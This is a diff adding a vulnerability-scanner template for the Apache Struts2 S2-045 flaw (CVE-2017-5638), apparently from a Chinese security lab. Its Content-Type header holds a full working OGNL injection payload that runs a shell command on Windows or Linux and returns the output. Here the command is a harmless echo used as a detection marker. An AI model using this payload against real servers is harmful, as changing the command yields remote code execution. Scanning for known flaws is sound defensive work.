@@ -1,0 +1,27 @@
+name: "Struts2 S2-045 RCE"
+cve: "CVE-2017-5638"
+product: "Apache Struts2"
+version_range: ">=2.3.0,<2.3.32"
+risk_level: "高危"
+description: "Apache Struts2 Content-Type远程代码执行漏洞"
+author: "昆仑安全实验室"
+tags:
+  - rce
+  - struts2
+  - content-type
+references:
+  - "https://nvd.nist.gov/vuln/detail/CVE-2017-5638"
+
+requests:
+  - method: "GET"
+    url: "{{target}}"
+    headers:
+      Content-Type: "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo VULNERABLE').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
+
+matchers:
+  - type: "word"
+    words:
+      - "VULNERABLE"
+  - type: "status"
+    status:
+      - 200
